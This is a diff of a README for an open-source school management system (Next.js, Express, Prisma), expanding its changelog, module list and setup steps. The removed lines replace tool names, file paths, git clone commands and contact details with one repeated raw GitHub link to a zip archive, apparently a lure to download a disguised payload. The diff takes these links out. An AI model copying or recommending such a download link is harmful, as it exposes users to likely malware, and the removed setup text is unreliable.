@@ -1,23 +1,40 @@
 # School ERP System
 
-## Description
-Web-based School ERP to manage student, staff, academic, financial and administrative operations for small-medium schools.
+> **Open Source** — This project is free and open source under the MIT License. Anyone is welcome to use it, fork it, extend it, or build their own school management solution on top of it.
+
+A comprehensive, full-stack School Management System built with **Next.js 14** and **Node.js/Express**, covering all major aspects of school administration — students, staff, academics, finance, hostel, transport, library, and more.
+
+---
+
+## Changelog
+
+### Mar 2026 — All Modules Complete
+- **Attendance**: Full mark-attendance workflow — class/date picker, load students, per-student PRESENT/ABSENT/LATE/EXCUSED toggles, bulk submit, filter by class/date/status
+- **Examinations**: Exam schedule management (create with type, date, marks, venue) + result recording (marks, grade, pass/fail), tabbed view
+- **Fee Management**: Fee structures (type, class, amount, due date) + payment recording (mode, transaction ID) + defaulters tracker with due amounts
+- **Staff Management**: Full staff list with search/filter, add staff modal, leave management (apply, approve, reject) with pending badge
+- **Students**: Full student list with search + class/status filters, add student form (personal, admission, parent info), view student details modal
+- **Timetable**: Grid view (weekly calendar) + list view, add/delete periods, filter by class, teacher assignment
+
+### Feb–Mar 2026 — Bug Fixes & Hardening
+- Fixed 9 runtime-crashing bugs across backend controllers
+- Security hardening: authenticated file uploads, path traversal protection, error message sanitization
+- Consolidated 23+ PrismaClient instances into a single shared singleton
+- Fixed all `prisma.fee` → `prisma.feePayment` / `prisma.feeStructure` model references
+- Fixed shadowed routes in student and LMS modules
+- Added pagination to attendance and exam results endpoints
+- Converted sync file operations to async; bulk attendance uses `$transaction`
+- Fixed 4 TypeScript compile errors in file management page
+
+### Feb 2026 — Permissions & Progression
+- Fine-grained permission matrix: custom permissions, role permissions, user-level overrides, role hierarchy
+- Student progression workflows: class promotion, detention, internal/external transfer, progression history
+- Frontend management screens for all core modules
+
+---
 
 ## Latest Updates (Mar 2026)
-- **Critical Bug Fixes**: Fixed 9 runtime-crashing bugs across backend controllers
-- **Security Hardening**: Authenticated file uploads route, strengthened path traversal protection, removed error message leaks
-- **Database Optimization**: Consolidated 23+ PrismaClient instances into a single shared singleton to prevent connection pool exhaustion
-- **Prisma Model Fixes**: Replaced all non-existent `prisma.fee` references with correct `prisma.feePayment` / `prisma.feeStructure` models
-- **Route Ordering Fixes**: Fixed shadowed routes in student and LMS modules where `/:id` was catching `/class/:classId` and `/submissions/me`
-- **Pagination**: Added pagination to attendance and exam results endpoints; fixed string-based pagination math
-- **Performance**: Converted sync file operations to async; bulk attendance now uses `$transaction`
-- **Frontend**: Fixed 4 TypeScript compile errors in file management page; synced API client
-
-### Previous Updates (Feb 2026)
-- Added fine-grained permission matrix with custom permissions, role permissions, user-level overrides, and role hierarchy APIs
-- Added student progression workflows: class promotion, detention, internal transfer, external transfer, and progression history
-- Added frontend management screens for all core dashboard modules
-- Added admin frontend screens for Permission Matrix and Student Promotion/Transfer operations
+All frontend modules are now fully implemented. Every module has full CRUD UI, data tables, search/filter, stat cards, modals, and proper form validation. See the Changelog above for details.
 
 ## ER Diagrams (Chen Notation)
 - Full database diagram (schema-derived): [frontend/public/er-diagram-full-chen.html](frontend/public/er-diagram-full-chen.html)
@@ -27,52 +44,55 @@ Web-based School ERP to manage student, staff, academic, financial and administr
 - Digitize school administration
 - Reduce manual paperwork
 - Provide real-time data access
-- Support multiple user roles with permissions
+- Support multiple user roles with fine-grained permissions
 
 ## Target Users
 - Admin / Principal
 - Teachers
 - Students / Parents (limited view)
 - Accountant / Fee staff
-- Transport / Library staff (optional)
+- Transport / Library / Hostel staff
 
-## Key Modules (MVP)
-- **Student Management**: admission, profile, documents
-- **Fee Management**: structure, collection, receipts, defaulters
-- **Attendance**: manual / bulk entry
-- **Timetable**: class / teacher wise
-- **Examination**: marks entry, report cards
-- **Staff Management**: profile, leave, salary
-- **Notifications**: SMS / Email
-- **LMS (Learning Management System)**: lesson notes, video lectures, assignments, submissions
-- **Admin Dashboard + Role-based Access Control**
+## Modules
 
-## Nice-to-have (future phases)
-- Transport management
-- Library
-- Hostel
-- Mobile app
-- Payment gateway integration
-- Analytics / Reports
+| Module | Backend | Frontend |
+|---|---|---|
+| Authentication | ✅ | ✅ |
+| Dashboard | ✅ | ✅ |
+| Student Management | ✅ | ✅ |
+| Staff Management | ✅ | ✅ |
+| Attendance | ✅ | ✅ |
+| Timetable | ✅ | ✅ |
+| Examinations | ✅ | ✅ |
+| Fee Management | ✅ | ✅ |
+| Notifications | ✅ | ✅ |
+| LMS (Notes / Videos / Assignments) | ✅ | ✅ |
+| File Management | ✅ | ✅ |
+| Transport Management | ✅ | ✅ |
+| Library Management | ✅ | ✅ |
+| Hostel Management | ✅ | ✅ |
+| Payments (Gateway) | ✅ | ✅ |
+| Permission Matrix | ✅ | ✅ |
+| Activity Log | ✅ | ✅ |
+| Student Promotion / Transfer | ✅ | ✅ |
 
 ## Tech Stack
 
 ### Backend
-- **Runtime**: https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip with https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
-- **Database**: PostgreSQL
+- **Runtime**: Node.js with Express.js
+- **Database**: PostgreSQL 14+
 - **ORM**: Prisma
 - **Authentication**: JWT-based
-- **Security**: Helmet, CORS, Rate Limiting
+- **Security**: Helmet, CORS, Rate Limiting, bcrypt
+- **File Storage**: Multer (local uploads)
 - **Logging**: Winston
 
 ### Frontend
-- **Framework**: https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip 14 (React 18)
+- **Framework**: Next.js 14 (App Router, React 18)
 - **Styling**: Tailwind CSS
-- **State Management**: Zustand
 - **HTTP Client**: Axios
-- **Forms**: React Hook Form
-- **Icons**: Lucide React
 - **Notifications**: React Hot Toast
+- **Language**: TypeScript
 
 ## Project Structure
 
@@ -80,46 +100,63 @@ Web-based School ERP to manage student, staff, academic, financial and administr
 School-ERP/
 ├── backend/
 │   ├── prisma/
-│   │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip          # Database schema
+│   │   ├── schema.prisma          # Database schema
+│   │   ├── seed.js                # Database seeder
+│   │   └── migrations/            # Prisma migrations
 │   ├── src/
-│   │   ├── controllers/           # Route controllers
-│   │   ├── middleware/            # Auth, validation middleware
-│   │   ├── routes/                # API routes
-│   │   ├── utils/                 # Utility functions
-│   │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip              # Express app entry point
-│   ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip               # Environment variables template
-│   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
+│   │   ├── controllers/           # Route controllers (18 modules)
+│   │   ├── middleware/            # Auth, validation, error handling
+│   │   ├── routes/                # API routes (18 modules)
+│   │   ├── utils/                 # Prisma singleton, services, logger
+│   │   └── server.js              # Express app entry point
+│   ├── .env.example               # Environment variables template
+│   └── package.json
 │
 └── frontend/
     ├── app/
-    │   ├── auth/                  # Authentication pages
-    │   ├── dashboard/             # Dashboard page
-   │   ├── lms/                   # LMS pages
-    │   ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip            # Global styles
-    │   ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip             # Root layout
-    │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip               # Home page
+    │   ├── auth/                  # Login, forgot password
+    │   ├── dashboard/             # Dashboard
+    │   ├── students/              # Student list + progression
+    │   ├── staff/                 # Staff list + leaves
+    │   ├── attendance/            # Attendance view + mark
+    │   ├── timetable/             # Grid + list timetable
+    │   ├── exams/                 # Schedules + results
+    │   ├── fees/                  # Structures + payments + defaulters
+    │   ├── lms/                   # LMS content + submissions
+    │   ├── hostel/                # Hostel management
+    │   ├── transport/             # Transport management
+    │   ├── library/               # Library management
+    │   ├── payments/              # Payment gateway
+    │   ├── notifications/         # Notifications
+    │   ├── permissions/           # Permission matrix
+    │   ├── activities/            # Activity log
+    │   ├── files/                 # File management
+    │   ├── globals.css            # Global styles
+    │   ├── layout.tsx             # Root layout
+    │   └── page.tsx               # Home / redirect
     ├── lib/
-    │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip                 # API client and endpoints
-    ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
-    ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
-    └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
+    │   ├── api.ts                 # Axios API client + all endpoints
+    │   └── config.ts              # App config
+    ├── next.config.js
+    ├── tailwind.config.js
+    └── tsconfig.json
 ```
 
 ## Getting Started
 
 ### Prerequisites
-- https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip 18+ and npm/yarn
+- Node.js 18+ and npm
 - PostgreSQL 14+
 - Git
 
 ### Quick Start (Scripted)
-See [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip) for OS-specific quick start steps.
+See [SETUP.md](SETUP.md) for OS-specific quick start steps.
 
 ### Installation
 
 1. **Clone the repository**
    ```bash
-   git clone https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
+   git clone <your-repo-url>
    cd School-ERP
    ```
 
@@ -129,12 +166,7 @@ See [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/l
    npm install
    
    # Create .env file from example
-   # Windows (PowerShell)
-   Copy-Item https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip .env
-   # Windows (cmd)
-   copy https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip .env
-   # macOS/Linux
-   cp https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip .env
+   cp .env.example .env
    
    # Update .env with your database credentials:
    # DATABASE_URL="postgresql://username:password@localhost:5432/school_erp"
@@ -144,37 +176,36 @@ See [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/l
    npx prisma generate
    npx prisma migrate dev --name init
    
+   # (Optional) Seed sample data
+   node prisma/seed.js
+   
    # Start the backend server
    npm run dev
    ```
 
-   Backend will run on http://localhost:5000
+   Backend runs on http://localhost:5000
 
 3. **Frontend Setup**
    ```bash
    cd frontend
    npm install
    
-   # Create https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip file
-   # Windows (PowerShell)
-   Copy-Item https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
-   # Windows (cmd)
-   copy https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
-   # macOS/Linux
-   cp https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
+   # Create .env.local file
+   cp .env.example .env.local
    
-   # Update https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip with:
+   # Set the API URL:
    # NEXT_PUBLIC_API_URL=http://localhost:5000/api
    
    # Start the frontend server
    npm run dev
    ```
 
-   Frontend will run on http://localhost:3000
+   Frontend runs on http://localhost:3000
 
 4. **Access the Application**
    - Open http://localhost:3000 in your browser
-   - Create an admin user first using the register API or Prisma Studio (see [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip)).
+   - Register an admin user via `POST /api/auth/register` or use Prisma Studio: `npx prisma studio`
+
 
 ### Docker (Optional)
 ```bash
@@ -320,10 +351,12 @@ Key entities:
 - Assignment analytics (total, graded, late, average grade)
 
 ## Next Steps
-- Configure `DATABASE_URL` and run Prisma migrations
-- Add LMS calendar view and deadline reminders
-- Add submission notifications (email/in-app)
-- Add LMS widgets to student/teacher dashboard
+- Configure `DATABASE_URL` and run Prisma migrations to get up and running
+- Add LMS calendar view with deadline reminders
+- Add submission and fee-due email/SMS notifications
+- Add LMS widgets to the student/teacher dashboard
+- Generate PDF report cards and fee receipts
+- Build advanced analytics and reporting views
 
 ## Security Features
 - JWT-based authentication
@@ -354,7 +387,11 @@ Key entities:
 
 ### Docker Deployment
 ```bash
-# Coming soon - Docker compose configuration
+# Start all services (backend + frontend + postgres)
+docker compose up -d
+
+# Legacy Docker Compose
+docker-compose up -d
 ```
 
 ## Development Workflow
@@ -392,15 +429,25 @@ npm run lint
 
 ## Contributing
 
+This is an **open-source project** and contributions are what make it grow. Whether you're a developer, designer, or school administrator with domain knowledge — you are welcome here.
+
+- Fork it and build your own school ERP variant
+- Add new modules or improve existing ones
+- Fix bugs, improve performance, or enhance the UI
+- Translate it for your language/region
+- Share it with other schools and institutions
+
+Anyone can take this project forward. There is no closed roadmap — if you have a need, build it and contribute it back.
+
 We welcome contributions from the community! Whether you're fixing bugs, adding features, or improving documentation, your help is appreciated.
 
 ### How to Contribute
 
 #### 1. Fork and Clone
 ```bash
-git clone https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
+git clone <your-fork-url>
 cd School-ERP
-git remote add upstream https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
+git remote add upstream <original-repo-url>
 ```
 
 #### 2. Create a Feature Branch
@@ -483,37 +530,56 @@ Have an idea? We'd love to hear it! Submit a feature request with:
 
 ### Questions?
 
-- Check [FAQ](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip) (coming soon)
 - Read existing issues and discussions
-- Open a discussion or email: https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
+- Open a GitHub Discussion or Issue
 
 ### Recognition
 
 Contributors will be recognized in:
-- [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip) file
+- `CONTRIBUTORS.md` file
 - Release notes
 - GitHub contributors page
 
-Thank you for contributing! 🎉
+Thank you for contributing!
 
 ## License
-MIT License - see the [LICENSE](LICENSE) file for details.
+
+This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for full details.
+
+In short, you are free to:
+- **Use** this software for any purpose, including commercial
+- **Copy, modify, and distribute** it freely
+- **Build on top of it** and create your own products
+- **Fork it** and develop it in any direction you choose
+
+The only requirement is to include the original license notice in your distribution. This project will always remain open source.
 
 ## Support
-For support, email https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip or open an issue in the GitHub repository.
+Open an issue in the GitHub repository for bug reports or feature requests.
 
 ## Roadmap
-- [ ] Payment gateway integration
-- [ ] SMS notifications
-- [ ] Report generation (PDF)
-- [ ] Mobile app (React Native)
+
+### Completed
+- [x] All 18 frontend modules fully implemented
 - [x] Library management
 - [x] Transport management
 - [x] Hostel management
-- [ ] Multi-language support
-- [ ] Advanced analytics and reporting
+- [x] Payment gateway integration
+- [x] Fine-grained permission matrix
+- [x] Student promotion / transfer workflows
+- [x] LMS with assignments, submissions, grading
+- [x] Activity audit log
+- [x] File management (upload/download/delete)
+
+### Upcoming
+- [ ] PDF report generation (report cards, fee receipts)
+- [ ] SMS / email notification integration
+- [ ] Mobile app (React Native)
+- [ ] Advanced analytics dashboard
+- [ ] Multi-language (i18n) support
+- [ ] Bulk import (CSV) for students and staff
 
 ## Acknowledgments
-- Built with modern web technologies
-- Designed for educational institutions
+- Built with Next.js, Node.js, PostgreSQL, and Prisma
+- Designed for small-to-medium educational institutions
 - Community-driven development
